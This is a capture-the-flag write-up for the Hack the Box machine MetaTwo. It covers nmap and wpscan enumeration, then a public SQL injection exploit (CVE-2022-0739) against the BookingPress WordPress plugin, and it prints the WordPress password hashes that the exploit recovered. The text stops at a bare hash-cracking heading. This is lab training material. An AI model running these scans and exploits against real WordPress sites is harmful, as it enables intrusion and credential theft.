# Hack the Box - MetaTwo

```CSS
IP: 10.10.11.186 - Linux
CMS: WordPress
```

## Open TCP Ports
### NMAP
```CSS
▶ nmap -Pn -sS -p- 10.10.11.186 -T4 --max-rate 1000 -oN open-ports.nmap

Nmap scan report for 10.10.11.186
Host is up (0.18s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh                                                                     
80/tcp open  http                                                                                                                                                          
                                                                                     
Nmap done: 1 IP address (1 host up) scanned in 608.38 seconds
```

## Open TCP Ports - Enumeration
### NMAP
```CSS
▶ nmap -sC -sV -p 21,22,80 10.10.11.186 -oN enum-ports.nmap

Nmap scan report for 10.10.11.186
Host is up (0.18s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh                                                                     
80/tcp open  http                                                                                                                                                          
                                                                                     
Nmap done: 1 IP address (1 host up) scanned in 608.38 seconds
▶ nmap -sC -sV -p 21,22,80 10.10.11.186 -oN enum-ports.nmap                  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 13:13 IST
Nmap scan report for 10.10.11.186
Host is up (0.18s latency).
                                          
PORT   STATE SERVICE VERSION
21/tcp open  ftp?                                                                    
| fingerprint-strings:                                                               
|   GenericLines:                                                                    
|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]           
|     Invalid command: try being more creative
|_    Invalid command: try being more creative 
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:                                                                       
|   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)
|   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)
|_  256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)            
80/tcp open  http    nginx 1.18.0                                                                                                                                          |_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/            
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service 
:                                                                                    
SF-Port21-TCP:V=7.93%I=7%D=4/19%Time=643F9BA1%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,8F,"220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10\
SF:.11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cre
SF:ative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative
SF:\r\n");                                                                                                                                                                 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel      
                                                                                                                                                                           
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 214.25 seconds
```

---

## WebServer
### Homepage
![image](https://user-images.githubusercontent.com/83878909/233007255-a55cb9c3-366e-4829-a1f8-9638da827959.png)
### Events
![image](https://user-images.githubusercontent.com/83878909/233008739-59e1f807-2a3d-4aa3-8330-d1f533cc569b.png)
### Events - Page Source
![image](https://user-images.githubusercontent.com/83878909/233020210-57f0a1ac-3af7-4f34-985a-6dd1647cdff2.png)

- CMS: `WordPress`
- Plugin: `Booking Press Appointment Booking`

---

## WordPress
### WPScan
```
▶ wpscan --url http://metapress.htb --disable-tls-checks --plugins-detection aggressive
```
### Wordpress Version
![image](https://user-images.githubusercontent.com/83878909/233022798-dfaef73b-dda4-4102-89f9-dee2e61aa871.png)
### Plugins
![image](https://user-images.githubusercontent.com/83878909/233045498-7825f211-1b68-4654-a7e0-31e5071e8186.png)

---

## Exploit (CVE-2022-0739)
### SQL Injection
  - Expolit: https://github.com/destr4ct/CVE-2022-0739

```CSS
▶ python booking-press-expl.py --url http://metapress.htb --nonce 55b094723b
```
![image](https://user-images.githubusercontent.com/83878909/233048115-82eca30b-607b-466f-820d-1c011dc1c67c.png)
  - Password Hashes
```
$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
```

### Crack Hashes
